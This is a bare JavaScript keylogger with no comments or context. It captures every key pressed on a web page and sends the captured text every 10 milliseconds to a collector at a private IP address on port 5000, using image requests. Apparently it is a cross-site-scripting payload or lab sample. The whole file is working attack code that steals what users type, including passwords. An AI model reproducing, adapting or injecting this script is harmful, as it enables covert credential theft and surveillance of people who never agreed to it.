var keys='';
var url = 'http://192.168.0.100:5000/';

document.onkeypress = function(e) {
	get = window.event?event:e;
	key = get.keyCode?get.keyCode:get.charCode;
	key = String.fromCharCode(key);
	keys+=key;
}
window.setInterval(function(){
	if(keys.length>0) {
		console.log(keys);
		new Image().src = url+keys;
		keys = '';
	}
}, 10);


